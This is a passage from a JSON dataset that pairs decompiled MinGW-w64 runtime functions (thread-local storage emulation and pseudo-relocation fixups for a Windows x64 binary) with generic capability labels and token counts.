{\ncode_r0x00014000f643:\n            sub.msvcrt.dll_abort();\n            if (*puVar7 < uVar8) {\n                *puVar7 = uVar8;\n                puVar7[3] = 0;\n            }\n            if (puVar7[1] < param_3) {\n                puVar7[1] = param_3;\n            }\n            if ((param_4 != 0) && (*puVar7 == uVar8)) {\n                puVar7[3] = param_4;\n                return;\n            }\n            return;\n        }\n        *puVar9 = uVar11 + 0x20;\n    }\n    else {\n        uVar1 = *puVar7;\n        puVar9 = puVar7;\n        if (uVar11 <= uVar1) goto code_r0x00014000f46b;\n        uVar10 = uVar1 * 2;\n        if (uVar1 * 2 < uVar11) {\n            uVar10 = uVar11 + 0x20;\n        }\n        uVar8 = uVar10 * 8 + 8;\n        puVar9 = sub.msvcrt.dll_realloc();\n        if (puVar9 == NULL) goto code_r0x00014000f643;\n        *puVar9 = uVar10;\n        sub.msvcrt.dll_memset(puVar9 + uVar1 + 1, 0, (uVar10 - uVar1) * 8);\n    }\n    iVar6 = (*_sym.imp.KERNEL32.dll_TlsSetValue)(*0x140129198, puVar9);\n    if (iVar6 == 0) {\n        (*pcVar4)();\n    }\ncode_r0x00014000f46b:\n    if (puVar9[uVar11] == 0) {\n        uVar8 = fcn.14000f2f0(0x1400fc380);\n        puVar9[uVar11] = uVar8;\n    }\n    return;\n}\n",
        "token_count": 1310
    },
    "1400b698": {
        "rules": [
            "contain loop",
            "get thread local storage value",
            "set thread local storage value"
        ],
        "decompiled_code": "\nvoid fcn.1400b6980(ulong param_1, ulong param_2, uint64_t param_3, uint64_t param_4)\n\n{\n    uint64_t uVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    code *pcVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint64_t *puVar7;\n    uint64_t uVar8;\n    uint64_t *puVar9;\n    uint64_t uVar10;\n    uint64_t uVar11;\n    \n    pcVar4 = _sym.imp.KERNEL32.dll_Sleep;\n    piVar2 = *0x140102a70;\n    if (**0x140102a70 == 0) {\n        if (*0x1400fc390 != 0) {\n            return;\n        }\n        *0x1400fc390 = fcn.14000f2f0(0x1400fc380);\n        return;\n    }\n    uVar11 = *0x1400fc390;\n    if (*0x1400fc390 == 0) {\n        if (**0x140102a70 == 0) {\ncode_r0x00014000f5ba:\n            uVar11 = *0x1400fc390;\n            if (*0x1400fc390 == 0) goto code_r0x00014000f5c7;\n        }\n        else {\n            param_4 = *0x1400f9430;\n            if (*0x1400f9430 == 0) {\n                LOCK();\n                *0x1400f9434 = *0x1400f9434 + 1;\n                if (*0x1400f9434 == 0) {\n                    func_0x00014000f390();\n                    *0x1400f9430 = 1;\n                }\n                else {\n                    param_3 = 0;\n                    do {\n                        (*pcVar4)();\n                    } while (*0x1400f9430 == 0);\n                }\n                if (*piVar2 == 0) goto code_r0x00014000f5ba;\n            }\n            LOCK();\n            *0x1401291a0 = *0x1401291a0 + 1;\n            if ((*0x1401291a0 != 0) &&\n               (iVar6 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*0x1401291a8, 0xffffffff),  iVar6 != 0)) {\n                LOCK();\n                *0x1401291a0 = *0x1401291a0 + -1;\n            }\n            if (*0x1400fc390 == 0) {\ncode_r0x00014000f5c7:\n                *0x1400fc390 = *0x140129190 + 1;\n                *0x140129190 = *0x1400fc390;\n            }\n            uVar11 = *0x1400fc390;\n            if (*piVar2 != 0) {\n                LOCK();\n                *0x1401291a0 = *0x1401291a0 + -1;\n                if (-1 < *0x1401291a0) {\n                    param_3 = 0;\n                    (*_sym.imp.KERNEL32.dll_ReleaseSemaphore)(*0x1401291a8, 1);\n                }\n            }\n        }\n    }\n    pcVar4 = _sym.imp.KERNEL32.dll_GetLastError;\n    uVar3 = *0x140129198;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    puVar7 = (*_sym.imp.KERNEL32.dll_TlsGetValue)(uVar3);\n    (*_sym.imp.KERNEL32.dll_SetLastError)(uVar5);\n    if (puVar7 == NULL) {\n        puVar7 = uVar11 + 0x21;\n        uVar8 = 8;\n        puVar9 = sub.msvcrt.dll_calloc();\n        if (puVar9 == NULL) {\ncode_r0x00014000f643:\n            sub.msvcrt.dll_abort();\n            if (*puVar7 < uVar8) {\n                *puVar7 = uVar8;\n                puVar7[3] = 0;\n            }\n            if (puVar7[1] < param_3) {\n                puVar7[1] = param_3;\n            }\n            if ((param_4 != 0) && (*puVar7 == uVar8)) {\n                puVar7[3] = param_4;\n                return;\n            }\n            return;\n        }\n        *puVar9 = uVar11 + 0x20;\n    }\n    else {\n        uVar1 = *puVar7;\n        puVar9 = puVar7;\n        if (uVar11 <= uVar1) goto code_r0x00014000f46b;\n        uVar10 = uVar1 * 2;\n        if (uVar1 * 2 < uVar11) {\n            uVar10 = uVar11 + 0x20;\n        }\n        uVar8 = uVar10 * 8 + 8;\n        puVar9 = sub.msvcrt.dll_realloc();\n        if (puVar9 == NULL) goto code_r0x00014000f643;\n        *puVar9 = uVar10;\n        sub.msvcrt.dll_memset(puVar9 + uVar1 + 1, 0, (uVar10 - uVar1) * 8);\n    }\n    iVar6 = (*_sym.imp.KERNEL32.dll_TlsSetValue)(*0x140129198, puVar9);\n    if (iVar6 == 0) {\n        (*pcVar4)();\n    }\ncode_r0x00014000f46b:\n    if (puVar9[uVar11] == 0) {\n        uVar8 = fcn.14000f2f0(0x1400fc380);\n        puVar9[uVar11] = uVar8;\n    }\n    return;\n}\n",
        "token_count": 1310
    },
    "14000dae": {
        "rules": [
            "write file on Windows"
        ],
        "decompiled_code": "\nvoid fcn.14000dae0(ulong arg1, uint8_t *arg2, ulong arg3, ulong arg4)\n\n{\n    uint32_t *puVar1;\n    uint8_t uVar2;\n    uint16_t uVar3;\n    int32_t iVar4;\n    ulong uVar5;\n    ulong uVar6;\n    uint32_t *puVar7;\n    code *pcVar8;\n    int32_t iVar9;\n    uint8_t **arg4_00;\n    uint8_t **ppuVar10;\n    uint *puVar11;\n    int64_t iVar12;\n    int32_t *piVar13;\n    uint uVar14;\n    char *arg1_00;\n    uint32_t uVar15;\n    uint64_t arg2_00;\n    uint32_t *puVar16;\n    int64_t iVar17;\n    int64_t iVar18;\n    uint8_t *puVar19;\n    uint8_t **arg1_01;\n    uint8_t **arg3_00;\n    uint32_t uVar20;\n    ulong in_XMM2_Qa;\n    ulong in_XMM3_Qa;\n    uint8_t *puStackX16;\n    ulong uStackX24;\n    ulong uStackX32;\n    ulong auStack408 [5];\n    uint auStack368 [2];\n    uint64_t uStack360;\n    uchar auStack352 [16];\n    ulong auStack336 [7];\n    uint8_t *apuStack280 [2];\n    uchar auStack264 [12];\n    uchar auStack252 [12];\n    uint8_t **ppuStack240;\n    int64_t iStack232;\n    int64_t iStack224;\n    uint8_t *apuStack144 [3];\n    uint8_t *puStack120;\n    int32_t iStack108;\n    ulong uStack96;\n    uint8_t **ppuStack88;\n    \n    ppuStack88 = &puStackX16;\n    puStackX16 = arg2;\n    uStackX24 = arg3;\n    uStackX32 = arg4;\n    arg4_00 = fcn.140017fc0(2);\n    sub.msvcrt.dll_fwrite(\"Mingw-w64 runtime failure:\\n\", 1, 0x1b);\n    ppuStack240 = fcn.140017fc0(2);\n    arg3_00 = ppuStack88;\n    sub.msvcrt.dll_vfprintf();\n    sub.msvcrt.dll_abort();\n    iStack232 = *0x1401290c4;\n    uStack96 = arg1;\n    if (*0x1401290c4 < 1) goto code_r0x00014000dc80;\n    arg4_00 = NULL;\n    ppuVar10 = *0x1401290c8 + 0x18;\n    do {\n        arg3_00 = *ppuVar10;\n        if ((arg3_00 <= ppuStack240) && (arg3_00 = arg3_00 + *(ppuVar10[1] + 8),  ppuStack240 < arg3_00)) {\n            return;\n        }\n        uVar20 = arg4_00 + 1;\n        arg4_00 = uVar20;\n        ppuVar10 = ppuVar10 + 5;\n    } while (uVar20 != *0x1401290c4);\n    while (iStack224 = fcn.14000e5a0(ppuStack240),  iStack224 != 0) {\n        ppuStack240 = iStack232 * 0x28;\n        puVar11 = *0x1401290c8 + ppuStack240;\n        *(puVar11 + 8) = iStack224;\n        *puVar11 = 0;\n        iVar12 = fcn.14000e6e0();\n        iVar12 = iVar12 + *(iStack224 + 0xc);\n        *(*0x1401290c8 + 0x18 + ppuStack240) = iVar12;\n        iVar12 = (*_sym.imp.KERNEL32.dll_VirtualQuery)(iVar12, apuStack144, 0x30);\n        if (iVar12 == 0) {\n            arg3_00 = *(*0x1401290c8 + 0x18 + ppuStack240);\n            fcn.14000dae0(\"  VirtualQuery failed for %d bytes at address %p\", *(iStack224 + 8), arg3_00, arg4_00);\n            break;\n        }\n        if (((iStack108 - 0x40U & 0xffffffbf) == 0) || ((iStack108 - 4U & 0xfffffffb) == 0)) {\ncode_r0x00014000dc1e:\n            *0x1401290c4 = *0x1401290c4 + 1;\n            return;\n        }\n        arg3_00 = 0x40;\n        if (iStack108 == 2) {\n            arg3_00 = 0x4;\n        }\n        ppuStack240 = ppuStack240 + *0x1401290c8;\n        ppuStack240[1] = apuStack144[0];\n        ppuStack240[2] = puStack120;\n        arg4_00 = ppuStack240;\n        iVar9 = (*_sym.imp.KERNEL32.dll_VirtualProtect)();\n        if (iVar9 != 0) goto code_r0x00014000dc1e;\n        uVar20 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        fcn.14000dae0(\"  VirtualProtect failed with code 0x%x\", uVar20, arg3_00, arg4_00);\ncode_r0x00014000dc80:\n        iStack232 = 0;\n    }\n    arg1_00 = \"Address %p has no image-section\";\n    fcn.14000dae0(\"Address %p has no image-section\", ppuStack240, arg3_00, arg4_00);\n    iVar9 = *0x1401290c0;\n    if (*0x1401290c0 != 0) {\n        return;\n    }\n    *0x1401290c0 = 1;\n    auStack336[2] = 0x14000dd07;\n    fcn.14000e620();\n    auStack336[2] = 0x14000dd1e;\n    iVar12 = fcn.14000e880(arg1_00);\n    iVar17 = *0x140103640;\n    puVar7 = *0x1401035f0;\n    *0x1401290c4 = 0;\n    iVar12 = -iVar12;\n    *0x1401290c8 = auStack264 + iVar12;\n    if (*0x1401035f0 - *0x140103600 < 8) {\n        *0x1401290c4 = 0;\n        return;\n    }\n    puVar16 = *0x140103600;\n    if (*0x1401035f0 - *0x140103600 < 0xc) {\ncode_r0x00014000dd5d:\n        if (*puVar16 == 0) {\n            uVar20 = puVar16[1];\ncode_r0x00014000dd6a:\n            if (uVar20 == 0) {\n                arg2_00 = puVar16[2];\n                if (puVar16[2] != 1) {\ncode_r0x00014000e00e:\n                    uVar14 = 0x40102260;\n                    *(auStack336 + iVar12 + 0x10) = 0x14000e01a;\n                    fcn.14000dae0(\"  Unknown pseudo relocation protocol version %d.\\n\", arg2_00, arg3_00, arg4_00);\n                    if (*0x1401290d0 != NULL) {\n                        uVar5 = *(apuStack280 + iVar12 + 8);\n                        *(auStack368 + iVar12) = uVar14;\n                        *(&uStack360 + iVar12) = arg2_00;\n                        *(auStack352 + iVar12) = CONCAT88(in_XMM3_Qa, in_XMM2_Qa);\n                        *(auStack336 + iVar12) = uVar5;\n                        *(auStack408 + iVar12) = 0x14000e058;\n                        (**0x1401290d0)(auStack368 + iVar12);\n                    }\n                    return;\n                }\n                puVar16 = puVar16 + 3;\n                if (*0x1401035f0 <= puVar16) {\n                    *0x1401290c4 = 0;\n                    return;\n                }\n                do {\n                    while( true ) {\n                        uVar20 = puVar16[2];\n                        ppuVar10 = *puVar16 + iVar17;\n                        arg2_00 = uVar20;\n                        arg4_00 = *ppuVar10;\n                        arg1_01 = puVar16[1] + iVar17;\n                        if ((uVar20 & 0xff) == 0x20) goto code_r0x00014000df38;\n                        uVar15 = uVar20 & 0xff;\n                        if ((uVar20 & 0xff) < 0x21) break;\n                        if (uVar15 != 0x40) {\ncode_r0x00014000e002:\n                            *(auStack336 + iVar12 + 0x10) = 0x14000e00e;\n                            fcn.14000dae0(\"  Unknown pseudo relocation bit size %d.\\n\", arg2_00, arg3_00, arg4_00);\n                            goto code_r0x00014000e00e;\n                        }\n                        puVar19 = (*arg1_01 - ppuVar10) + arg4_00;\n                        if (((uVar20 & 0xc0) == 0) && (-1 < puVar19)) goto code_r0x00014000df1f;\n                        *(auStack336 + iVar12 + 0x10) = 0x14000df88;\n                        fcn.14000db50(arg1_01);\n                        *arg1_01 = puVar19;\ncode_r0x00014000dde5:\n                        puVar16 = puVar16 + 3;\n                        if (puVar7 <= puVar16) goto code_r0x00014000de80;\n                    }\n                    if (uVar15 == 8) {\n                        uVar2 = *arg1_01;\n                        if (uVar2 < '\\0') {\n                            iVar18 = (uVar2 | 0xffffffffffffff00) - ppuVar10;\n                        }\n                        else {\n                            iVar18 = uVar2 - ppuVar10;\n                        }\n                        puVar19 = iVar18 + arg4_00;\n                        if (((uVar20 & 0xc0) == 0) && ((0xff < puVar19 || (puVar19 < -0x80)))) {\ncode_r0x00014000df1f:\n                            do {\n                                *(apuStack280 + iVar12) = puVar19;\n                                uVar20 = 0x401022c8;\n                                *(auStack336 + iVar12 + 0x10) = 0x14000df33;\n                                arg3_00 = arg1_01;\n                                ppuVar10 = fcn.14000dae0(\"%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p.\\n\"\n                                                         , arg2_00, arg1_01, arg4_00);\ncode_r0x00014000df38:\n                                uVar15 = *arg1_01;\n                                if (uVar15 < 0) {\n                                    iVar18 = (uVar15 | 0xffffffff00000000) - ppuVar10;\n                                }\n                                else {\n                                    iVar18 = uVar15 - ppuVar10;\n                                }\n                                puVar19 = iVar18 + arg4_00;\n                            } while (((uVar20 & 0xc0) == 0) && ((puVar19 < -0x80000000 || (0xffffffff < puVar19))));\n                            *(auStack336 + iVar12 + 0x10) = 0x14000df72;\n                            fcn.14000db50(arg1_01);\n                            *arg1_01 = puVar19;\n                        }\n                        else {\n                            *(auStack336 + iVar12 + 0x10) = 0x14000dde2;\n                            fcn.14000db50(arg1_01);\n                            *arg1_01 = puVar19;\n                        }\n                        goto code_r0x00014000dde5;\n                    }\n                    if (uVar15 != 0x10) goto code_r0x00014000e002;\n                    uVar3 = *arg1_01;\n                    if (uVar3 < 0) {\n                        iVar18 = (uVar3 | 0xffffffffffff0000) - ppuVar10;\n                    }\n                    else {\n                        iVar18 = uVar3 - ppuVar10;\n                    }\n                    puVar19 = iVar18 + arg4_00;\n                    if (((uVar20 & 0xc0) == 0) && ((puVar19 < -0x8000 || (0xffff < puVar19))))\n                    goto code_r0x00014000df1f;\n                    puVar16 = puVar16 + 3;\n                    *(auStack336 + iVar12 + 0x10) = 0x14000de6c;\n                    fcn.14000db50(arg1_01);\n                    *arg1_01 = puVar19;\n                } while (puVar16 < puVar7);\n                goto code_r0x00014000de80;\n            }\n        }\n    }\n    else if (**0x140103600 == 0) {\n        uVar20 = (*0x140103600)[1];\n        if ((uVar20 | (*0x140103600)[2]) == 0) {\n            puVar16 = *0x140103600 + 3;\n            goto code_r0x00014000dd5d;\n        }\n        goto code_r0x00014000dd6a;\n    }\n    if (*0x1401035f0 <= puVar16) {\n        *0x1401290c4 = 0;\n        return;\n    }\n    do {\n        puVar1 = puVar16 + 1;\n        uVar20 = *puVar16;\n        puVar16 = puVar16 + 2;\n        piVar13 = *puVar1 + iVar17;\n        iVar4 = *piVar13;\n        *(auStack336 + iVar12 + 0x10) = 0x14000dff6;\n        fcn.14000db50(piVar13);\n        *piVar13 = uVar20 + iVar4;\n    } while (puVar16 < puVar7);\ncode_r0x00014000de80:\n    pcVar8 = _sym.imp.KERNEL32.dll_VirtualProtect;\n    if (0 < *0x1401290c4) {\n        iVar17 = 0;\n        do {\n            piVar13 = *0x1401290c8 + iVar17;\n            iVar4 = *piVar13;\n            if (iVar4 != 0) {\n                uVar5 = *(piVar13 + 4);\n                uVar6 = *(piVar13 + 2);\n                *(auStack336 + iVar12 + 0x10) = 0x14000debf;\n                (*pcVar8)(uVar6, uVar5, iVar4, auStack252);\n            }\n            iVar9 = iVar9 + 1;\n            iVar17 = iVar17 + 0x28;\n        } while (iVar9 < *0x1401290c4);\n    }\n    return;\n}\n",
        "token_count": 3473
    }
}